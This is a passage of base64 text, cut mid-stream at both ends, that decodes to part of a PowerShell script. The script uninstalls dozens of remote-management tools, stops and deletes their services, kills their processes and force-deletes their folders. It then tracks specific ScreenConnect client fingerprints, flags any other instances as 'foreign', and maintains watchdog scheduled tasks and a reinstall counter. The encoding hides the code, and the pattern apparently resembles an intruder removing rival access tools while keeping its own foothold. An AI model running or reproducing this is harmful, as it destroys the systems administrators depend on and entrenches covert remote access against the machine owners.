cmUgUmVtb3RlIFN1cHBvcnQiKTsgUHJvZD1AKCdEYW1lV2FyZSonKSB9CiAgICAgICAgQHsgVGFn
PSdOZXRTdXBwb3J0JzsgICBTdmM9QCgnTmV0U3VwcG9ydConKTsgUHJvYz1AKCdjbGllbnQzMion
LCdwY2ljdGwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmV0U3VwcG9ydCIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxOZXRTdXBwb3J0Iik7IFByb2Q9QCgnTmV0U3VwcG9ydConKSB9
CiAgICAgICAgQHsgVGFnPSdTaW1wbGVIZWxwJzsgICBTdmM9QCgnU2ltcGxlSGVscConKTsgUHJv
Yz1AKCdTaW1wbGVTZXJ2aWNlKicsJ3NpbXBsZXNlcnZpY2UqJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcU2ltcGxlSGVscCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTaW1wbGVIZWxw
Iik7IFByb2Q9QCgnU2ltcGxlSGVscConKSB9CiAgICAgICAgQHsgVGFnPSdHZXRTY3JlZW4nOyAg
ICBTdmM9QCgnR2V0U2NyZWVuKicpOyBQcm9jPUAoJ0dldFNjcmVlbionKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xHZXRTY3JlZW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR2V0U2Ny
ZWVuIik7IFByb2Q9QCgnR2V0U2NyZWVuKicpIH0KICAgICAgICBAeyBUYWc9J0lwZXJpdXMnOyAg
ICAgIFN2Yz1AKCdJcGVyaXVzKicpOyBQcm9jPUAoJ0lwZXJpdXNSZW1vdGUqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcSXBlcml1cyBSZW1vdGUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cSXBlcml1cyBSZW1vdGUiKTsgUHJvZD1AKCdJcGVyaXVzKicpIH0KICAgICAgICBAeyBUYWc9
J0lTTE9ubGluZSc7ICAgU3ZjPUAoJ0lTTGxpZ2h0KicpOyBQcm9jPUAoJ0lTTGxpZ2h0KicsJ0lT
TEFsd2F5c09uKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElTTCBPbmxpbmUiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cSVNMIE9ubGluZSIpOyBQcm9kPUAoJ0lTTCBMaWdodConLCdJ
U0wgQWx3YXlzT24qJykgfQogICAgICAgIEB7IFRhZz0nQW1teXknOyAgICAgICAgU3ZjPUAoJ0Ft
bXl5KicpOyBQcm9jPUAoJ0FtbXl5KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFtbXl5
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFtbXl5Iik7IFByb2Q9QCgnQW1teXkqJykgfQog
ICAgICAgIEB7IFRhZz0nVWx0cmFWaWV3ZXInOyAgU3ZjPUAoJ1VsdHJhVmlld2VyKicpOyBQcm9j
PUAoJ1VsdHJhVmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVmlld2Vy
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFVsdHJhVmlld2VyIik7IFByb2Q9QCgnVWx0cmFW
aWV3ZXIqJykgfQogICAgICAgIEB7IFRhZz0nQWVyb0FkbWluJzsgICAgU3ZjPUAoJ0Flcm9BZG1p
bionKTsgUHJvYz1AKCdBZXJvQWRtaW4qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWVy
b0FkbWluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFlcm9BZG1pbiIpOyBQcm9kPUAoJ0Fl
cm9BZG1pbionKSB9CiAgICAgICAgQHsgVGFnPSdMaXRlTWFuYWdlcic7ICBTdmM9QCgnTGl0ZU1h
bmFnZXIqJyk7IFByb2M9QCgnUk9NU2VydmVyKicsJ1JPTVZpZXdlcionKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xMaXRlTWFuYWdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMaXRl
TWFuYWdlciIpOyBQcm9kPUAoJ0xpdGVNYW5hZ2VyKicpIH0KICAgICAgICBAeyBUYWc9J1JhZG1p
bic7ICAgICAgIFN2Yz1AKCdSYWRtaW4qJyk7IFByb2M9QCgncnNlcnZlcjMqJywnUmFkbWluKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJhZG1pbiBTZXJ2ZXIgMyIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxSYWRtaW4gU2VydmVyIDMiKTsgUHJvZD1AKCdSYWRtaW4qJykgfQogICAg
ICAgIEB7IFRhZz0nTm9NYWNoaW5lJzsgICAgU3ZjPUAoJ254c2VydmVyKicsJ254ZConKTsgUHJv
Yz1AKCdueGQqJywnbnhzZXJ2ZXIqJywnbnhydW5uZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFt
RmlsZXNcTm9NYWNoaW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5vTWFjaGluZSIpOyBQ
cm9kPUAoJ05vTWFjaGluZSonKSB9CiAgICAgICAgQHsgVGFnPSdOaW5qYU9uZSc7ICAgICBTdmM9
QCgnTmluamFSTU1BZ2VudCcsJ25pbmphcm1tKicsJ05pbmphUk1NKicpOyBQcm9jPUAoJ05pbmph
Uk1NQWdlbnQqJywnbmluamFybW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmluamFS
TU1BZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYVJNTUFnZW50IiwiJGVudjpQ
cm9ncmFtRGF0YVxOaW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTmluamFPbmUiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmluamFPbmUiKTsgUHJvZD1AKCdOaW5qYVJNTSonLCdO
aW5qYU9uZSonKSB9CiAgICAgICAgQHsgVGFnPSdBdGVyYSc7ICAgICAgICBTdmM9QCgnQXRlcmFB
Z2VudCcpOyBQcm9jPUAoJ0F0ZXJhQWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
QVRFUkEgTmV0d29ya3MiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQVRFUkEgTmV0d29ya3Mi
LCIkZW52OlByb2dyYW1EYXRhXEFURVJBIE5ldHdvcmtzIik7IFByb2Q9QCgnQXRlcmEqJykgfQog
ICAgICAgIEB7IFRhZz0nQ29ubmVjdFdpc2UnOyAgU3ZjPUAoJ0xUU2VydmljZScsJ0xUU3ZjTW9u
Jyk7IFByb2M9QCgnTFRTdmMqJywnTFRUcmF5KicpOyBEaXJzPUAoIiRlbnY6d2luZGlyXExUU3Zj
IiwiJGVudjpQcm9ncmFtRmlsZXNcTGFiVGVjaCBDbGllbnQiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cTGFiVGVjaCBDbGllbnQiKTsgUHJvZD1AKCdDb25uZWN0V2lzZSBBdXRvbWF0ZSonLCdD
b25uZWN0V2lzZSBSTU0qJywnTGFiVGVjaConKSB9CiAgICAgICAgQHsgVGFnPSdLYXNleWEnOyAg
ICAgICBTdmM9QCgnQWdlbnRNb24nLCdLYXNleWEqJywnS0FBRFMqJyk7IFByb2M9QCgnQWdlbnRN
b24qJywnS2FzZXlhKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEthc2V5YSIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxLYXNleWEiKTsgUHJvZD1AKCdLYXNleWEgVlNBKicsJ0thc2V5
YSBBZ2VudConKSB9CiAgICAgICAgQHsgVGFnPSdOYWJsZSc7ICAgICAgICBTdmM9QCgnQWR2YW5j
ZWQgTW9uaXRvcmluZyBBZ2VudConLCdOLWFibGUqJywnTkNlbnRyYWwqJyk7IFByb2M9QCgnRmls
ZVN5c3RlbUFnZW50KicsJ05DZW50cmFsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFk
dmFuY2VkIE1vbml0b3JpbmcgQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWR2YW5j
ZWQgTW9uaXRvcmluZyBBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE4tYWJsZSBUZWNobm9sb2dp
ZXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTi1hYmxlIFRlY2hub2xvZ2llcyIsIiRlbnY6
UHJvZ3JhbUZpbGVzXE1TUEEgRmlsZXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTVNQQSBG
aWxlcyIpOyBQcm9kPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQqJywnTi1hYmxlKicsJ04t
Y2VudHJhbConLCdOLXNpZ2h0KicsJ1Rha2UgQ29udHJvbConLCdTb2xhcldpbmRzIE1TUConKSB9
CiAgICAgICAgQHsgVGFnPSdTeW5jcm8nOyAgICAgICBTdmM9QCgnU3luY3JvKicsJ0thYnV0byon
KTsgUHJvYz1AKCdTeW5jcm8qJywnS2FidXRvKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XFJlcGFpclRlY2giLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVwYWlyVGVjaCIsIiRlbnY6
UHJvZ3JhbUZpbGVzXFN5bmNybyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTeW5jcm8iLCIk
ZW52OlByb2dyYW1EYXRhXFN5bmNybyIpOyBQcm9kPUAoJ1N5bmNybyonLCdLYWJ1dG8qJywnUmVw
YWlyVGVjaConKSB9CiAgICAgICAgQHsgVGFnPSdQdWxzZXdheSc7ICAgICBTdmM9QCgnUHVsc2V3
YXkqJywnUEMgTW9uaXRvcionKTsgUHJvYz1AKCdQQ01vbml0b3JNZ3IqJywnUENNb25pdG9yTWFu
YWdlcionLCdQdWxzZXdheSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xQdWxzZXdheSIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQdWxzZXdheSIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBD
IE1vbml0b3IiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUEMgTW9uaXRvciIpOyBQcm9kPUAo
J1B1bHNld2F5KicsJ1BDIE1vbml0b3IqJykgfQogICAgICAgIEB7IFRhZz0nU3VwZXJPcHMnOyAg
ICAgU3ZjPUAoJ1N1cGVyT3BzKicpOyBQcm9jPUAoJ1N1cGVyT3BzKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXFN1cGVyT3BzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cGVyT3Bz
IiwiJGVudjpQcm9ncmFtRGF0YVxTdXBlck9wcyIpOyBQcm9kPUAoJ1N1cGVyT3BzKicpIH0KICAg
ICAgICBAeyBUYWc9J0xldmVsJzsgICAgICAgIFN2Yz1AKCdMZXZlbConKTsgUHJvYz1AKCdsZXZl
bConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMZXZlbCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxMZXZlbCIsIiRlbnY6UHJvZ3JhbURhdGFcTGV2ZWwiKTsgUHJvZD1AKCdMZXZlbCon
KSB9CiAgICAgICAgQHsgVGFnPSdBY3Rpb24xJzsgICAgICBTdmM9QCgnQWN0aW9uMSonKTsgUHJv
Yz1AKCdBY3Rpb24xKicsJ2FjdGlvbjFfYWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcQWN0aW9uMSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBY3Rpb24xIiwiJGVudjpQcm9n
cmFtRGF0YVxBY3Rpb24xIik7IFByb2Q9QCgnQWN0aW9uMSonKSB9CiAgICAgICAgQHsgVGFnPSdN
YW5hZ2VFbmdpbmUnOyBTdmM9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRENBZ2VudConKTsg
UHJvYz1AKCdNYW5hZ2VFbmdpbmUqJywnZGNhZ2VudConLCdVRU1TKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXE1hbmFnZUVuZ2luZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNYW5h
Z2VFbmdpbmUiKTsgUHJvZD1AKCdNYW5hZ2VFbmdpbmUqJywnVUVNUyonLCdEZXNrdG9wIENlbnRy
YWwqJywnRW5kcG9pbnQgQ2VudHJhbConLCdSTU0gQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFn
PSdUYWN0aWNhbFJNTSc7ICBTdmM9QCgndGFjdGljYWxybW0qJywnTWVzaCBBZ2VudCcsJ01lc2hB
Z2VudCcpOyBQcm9jPUAoJ3RhY3RpY2Fscm1tKicsJ21lc2hhZ2VudConLCdNZXNoQWdlbnQqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVGFjdGljYWxBZ2VudCIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxUYWN0aWNhbEFnZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTWVzaCBBZ2VudCIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7IFByb2Q9QCgnVGFjdGljYWwq
JywnTWVzaCBBZ2VudConLCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdNZXNoQ2Vu
dHJhbCc7ICBTdmM9QCgnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcsJ01lc2hDZW50cmFsKicpOyBQ
cm9jPUAoJ01lc2hBZ2VudConLCdNZXNoQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsg
UHJvZD1AKCdNZXNoKkFnZW50KicsJ01lc2hDZW50cmFsKicpIH0KICAgICAgICBAeyBUYWc9J0Nv
bnRpbnV1bSc7ICAgIFN2Yz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsgUHJvYz1AKCdTQUFaKics
J0NvbnRpbnV1bSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTQUFaT0QiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cU0FBWk9EIiwiJGVudjpQcm9ncmFtRmlsZXNcQ29udGludXVtIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XENvbnRpbnV1bSIpOyBQcm9kPUAoJ0NvbnRpbnV1bSon
LCdTQUFaKicpIH0KICAgICAgICBAeyBUYWc9J05hdmVyaXNrJzsgICAgIFN2Yz1AKCdOYXZlcmlz
ayonKTsgUHJvYz1AKCdOYXZlcmlzayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOYXZl
cmlzayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOYXZlcmlzayIpOyBQcm9kPUAoJ05hdmVy
aXNrKicpIH0KICAgICAgICBAeyBUYWc9J0ltbXlCb3QnOyAgICAgIFN2Yz1AKCdJbW15Qm90Kics
J0ltbXkqJyk7IFByb2M9QCgnSW1teUFnZW50KicsJ0ltbXlCb3QqJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcSW1teUJvdCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxJbW15Qm90Iiwi
JGVudjpQcm9ncmFtRGF0YVxJbW15Qm90Iik7IFByb2Q9QCgnSW1teUJvdConKSB9CiAgICAgICAg
QHsgVGFnPSdBdXRvbW94JzsgICAgICBTdmM9QCgnYW1hZ2VudConLCdBdXRvbW94KicpOyBQcm9j
PUAoJ2FtYWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQXV0b21veCIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxBdXRvbW94IiwiJGVudjpQcm9ncmFtRGF0YVxhbWFnZW50Iik7
IFByb2Q9QCgnQXV0b21veConKSB9CiAgICAgICAgQHsgVGFnPSdBY3JvbmlzQ3liZXInOyBTdmM9
QCgnQWNyb25pcyonKTsgUHJvYz1AKCdhY3JvY21kKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXEFjcm9uaXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWNyb25pcyIpOyBQcm9kPUAo
J0Fjcm9uaXMgQ3liZXIqJywnQWNyb25pcyBBZ2VudConLCdDeWJlciBQcm90ZWN0IEFnZW50Kicp
IH0KICAgICAgICBAeyBUYWc9J0RvbW90eic7ICAgICAgIFN2Yz1AKCdEb21vdHoqJyk7IFByb2M9
QCgnRG9tb3R6KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERvbW90eiIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxEb21vdHoiKTsgUHJvZD1AKCdEb21vdHoqJykgfQogICAgICAgIEB7
IFRhZz0nQXV2aWsnOyAgICAgICAgU3ZjPUAoJ0F1dmlrKicpOyBQcm9jPUAoJ0F1dmlrKicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dmlrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XEF1dmlrIik7IFByb2Q9QCgnQXV2aWsqJykgfQogICAgICAgIEB7IFRhZz0nQmFycmFjdWRhUk1N
JzsgU3ZjPUAoJ0JhcnJhY3VkYSonKTsgUHJvYz1AKCdNV1NlcnZpY2UqJyk7IERpcnM9QCgiJGVu
djpQcm9ncmFtRmlsZXNcQmFycmFjdWRhIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEJhcnJh
Y3VkYSIsIiRlbnY6UHJvZ3JhbUZpbGVzXExldmVsIFBsYXRmb3JtcyIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxMZXZlbCBQbGF0Zm9ybXMiKTsgUHJvZD1AKCdCYXJyYWN1ZGEgUk1NKicsJ01h
bmFnZWQgV29ya3BsYWNlKicpIH0KICAgICAgICBAeyBUYWc9J0dvdmVybGFuJzsgICAgIFN2Yz1A
KCdHb3ZlcmxhbionKTsgUHJvYz1AKCdnb3ZlcmxhbionLCdnb3ZhZ2VudConKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xHb3ZlcmxhbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb3Zl
cmxhbiIpOyBQcm9kPUAoJ0dvdmVybGFuKicpIH0KICAgICAgICBAeyBUYWc9J1BEUSc7ICAgICAg
ICAgIFN2Yz1AKCdQRFEqJyk7IFByb2M9QCgnUERRUnVubmVyKicsJ1BEUUludmVudG9yeSonLCdQ
RFFEZXBsb3kqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWRtaW4gQXJzZW5hbCIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZG1pbiBBcnNlbmFsIiwiJGVudjpQcm9ncmFtRmlsZXNc
UERRIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBEUSIpOyBQcm9kPUAoJ1BEUSBEZXBsb3kq
JywnUERRIEludmVudG9yeSonLCdQRFEgQ29ubmVjdConKSB9CiAgICApCgogICAgZm9yZWFjaCAo
JHRvb2wgaW4gJHJtbSkgewogICAgICAgICRoaXQgPSAkZmFsc2UKICAgICAgICBmb3JlYWNoICgk
cGF0IGluICR0b29sLlByb2QpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlw
dDpVbmluc3RhbGxSb290cykgewogICAgICAgICAgICAgICAgR2V0LUNoaWxkSXRlbSAkcm9vdCAt
RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAg
ICAgICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgICAgICAgICAgaWYgKCRk
biAtYW5kICRkbiAtbGlrZSAkcGF0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChJcy1E
YXR0b0tlZXBlciAkZG4pIHsgTG9nICJybW1fc2tpcF9kYXR0b19rZWVwIFskZG5dIjsgcmV0dXJu
IH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9kdWN0S2V5ICRfKSB7
ICRuLnJtbSsrOyAkaGl0ID0gJHRydWUgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAg
ICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkcGF0IGlu
ICR0b29sLlN2YykgewogICAgICAgICAgICBHZXQtU2VydmljZSAtTmFtZSAkcGF0IC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAg
aWYgKElzLURhdHRvS2VlcGVyICRfLk5hbWUgLW9yIElzLURhdHRvS2VlcGVyICRfLkRpc3BsYXlO
YW1lKSB7IExvZyAicm1tX3NraXBfZGF0dG9fc3ZjICQoJF8uTmFtZSkiOyByZXR1cm4gfQogICAg
ICAgICAgICAgICAgJiBzYy5leGUgc3RvcCAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAg
ICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDUwMAogICAgICAgICAgICAg
ICAgJiBzYy5leGUgZGVsZXRlICIkKCRfLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAg
ICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3N2Y19kZWxldGVkICQoJF8u
TmFtZSkgWyQoJHRvb2wuVGFnKV0iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9y
ZWFjaCAoJHBhdCBpbiAkdG9vbC5Qcm9jKSB7CiAgICAgICAgICAgIEdldC1Qcm9jZXNzIC1OYW1l
ICRwYXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAg
ICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLklkIC1Gb3JjZSAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQogICAgICAgICAgICAgICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsg
TG9nICJybW1fcHJvY19raWxsZWQgJCgkXy5Qcm9jZXNzTmFtZSkgWyQoJHRvb2wuVGFnKV0iCiAg
ICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJGQgaW4gJHRvb2wuRGlycykg
ewogICAgICAgICAgICBpZiAoJGQgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsK
ICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAkZCkgeyBMb2cgInJtbV9za2lwX2Rh
dHRvX2RpciAkZCI7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1SZW1vdmVE
aXIgJGQpIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fZGlyX3JlbW92ZWQgJGQi
IH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7IExvZyAicm1tX2Rpcl9SRU1PVkVf
RkFJTEVEICRkIiB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRoaXQpIHsg
TG9nICJybW1fZXh0ZXJtaW5hdGVkICQoJHRvb2wuVGFnKSIgfQogICAgfQoKICAgICRzdW1tYXJ5
ID0gImV4dGVybWluYXRlIHN2Yz0kKCRuLnN2YykgcHJvYz0kKCRuLnByb2MpIGRpcj0kKCRuLmRp
cikgcHJvZHVjdD0kKCRuLnByb2R1Y3QpIHJtbT0kKCRuLnJtbSkgZmFpbD0kKCRuLmZhaWwpIgog
ICAgTG9nICRzdW1tYXJ5CiAgICByZXR1cm4gJHN1bW1hcnkKfQoKZnVuY3Rpb24gVXBkYXRlLVN0
YXRlIHsKICAgICRrZWVwID0gQChHZXQtS2VlcEZpbmdlcnByaW50cykKICAgICRncnl4YUZwID0g
R2V0LUdyeXhhRnAKICAgICRwcmltID0gJG51bGw7ICRhbHQgPSAkbnVsbDsgJHNjcmlwdDpncnl4
YSA9ICRudWxsCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVu
Q29ubmVjdCBDbGllbnQqJykpIHsKICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAt
OWEtZl17MTZ9KVwpJykgewogICAgICAgICAgICBpZiAoJG1hdGNoZXNbMV0gLWVxICc1ZjYwMTA1
Nzk4NTJlNTA3JykgeyAkcHJpbSA9ICIkKCRzdmMuU3RhdHVzKSIgfQogICAgICAgICAgICBlbHNl
aWYgKCRtYXRjaGVzWzFdIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJGFsdCA9ICIkKCRzdmMu
U3RhdHVzKSIgfQogICAgICAgICAgICBlbHNlaWYgKCRtYXRjaGVzWzFdIC1lcSAkZ3J5eGFGcCkg
eyAkc2NyaXB0OmdyeXhhID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAgfQogICAgfQogICAg
JGZvcmVpZ24gPSBAKCkKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdT
Y3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdc
KChbMC05YS1mXXsxNn0pXCknIC1hbmQgJG1hdGNoZXNbMV0gLW5vdGluICRrZWVwKSB7CiAgICAg
ICAgICAgICRmb3JlaWduICs9ICRtYXRjaGVzWzFdCiAgICAgICAgfQogICAgfQogICAgJGlkID0g
UmVhZC1JZGVudGl0eQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3RhbCA9IDAKICAgIGZvcmVh
Y2ggKCRrIGluICdUQVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNLX0QnKSB7CiAgICAgICAg
JHRhc2tzVG90YWwrKwogICAgICAgICR0biA9IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10k
aWRbJGtdKQogICAgICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgJG1hcmtl
ciA9IGlmICgkayAtZXEgJ1RBU0tfQicpIHsgJ2V0bF9tb24uY21kJyB9IGVsc2UgeyAnb3duX21v
bi5jbWQnIH0KICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRuICRtYXJrZXIpIC1vciAo
VGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkbWFya2VyKSkgeyAkdGFza3NPaysrIH0KICAgIH0K
ICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdv
d25fbW9uLmNtZCcgfQogICAgJHdkID0gRW5zdXJlLVdhdGNoZG9nCiAgICAkcHJldiA9IEB7fQog
ICAgJHN0YXRlUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbicKICAgIGlmIChU
ZXN0LVBhdGggJHN0YXRlUGF0aCkgewogICAgICAgIHRyeSB7IChHZXQtQ29udGVudCAtTGl0ZXJh
bFBhdGggJHN0YXRlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbikuUFNPYmplY3QuUHJvcGVy
dGllcyB8IEZvckVhY2gtT2JqZWN0IHsgJHByZXZbJF8uTmFtZV0gPSAkXy5WYWx1ZSB9IH0gY2F0
Y2gge30KICAgIH0KICAgICRpbnN0YWxsQ291bnQgPSAxCiAgICBpZiAoJHByZXYuaW5zdGFsbENv
dW50KSB7ICRpbnN0YWxsQ291bnQgPSBbaW50XSRwcmV2Lmluc3RhbGxDb3VudCB9CiAgICBpZiAo
JHByZXYucHJpbSAtYW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAtYW5kICRwcmltIC1lcSAn
UnVubmluZycpIHsgJGluc3RhbGxDb3VudCsrIH0KICAgICRzdGF0ZSA9IFtvcmRlcmVkXUB7CiAg
ICAgICAgaG9zdCAgICAgICAgID0gJGVudjpDT01QVVRFUk5BTUUKICAgICAgICB0cyAgICAgICAg
ICAgPSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykKICAgICAgICBi
dWlsZCAgICAgICAgPSAkQnVpbGQKICAgICAgICBwcmltICAgICAgICAgPSAkKGlmICgkcHJpbSkg
eyAkcHJpbSB9IGVsc2UgeyAnTUlTU0lORycgfSkKICAgICAgICBhbHQgICAgICAgICAgPSAkKGlm
